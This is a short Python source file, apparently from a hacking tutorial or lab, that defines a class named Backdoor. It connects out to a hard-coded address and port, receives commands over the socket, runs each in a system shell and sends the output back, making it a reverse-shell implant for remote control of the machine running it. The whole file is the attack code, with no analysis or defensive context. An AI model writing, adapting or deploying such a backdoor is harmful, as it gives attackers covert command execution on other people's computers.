import socket
import subprocess
import json


class Backdoor:
    def __init__(self, ip, port):
        self.port = port
        self.ip = ip

        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((self.ip, self.port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = self.connection.recv(1024)
        json_data = json_data.decode("utf-8")
        return json.loads(json_data)

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        try:
            while True:
                command = self.reliable_receive()
                command_result = self.execute_system_command(command)
                self.reliable_send(command_result)

        except KeyboardInterrupt:
            print("\n[-] Quiting")
            self.connection.close()


if __name__ == "__main__":
    ip = "192.168.1.68"
    port = 8080

    backdoor = Backdoor(ip, port)
    backdoor.run()


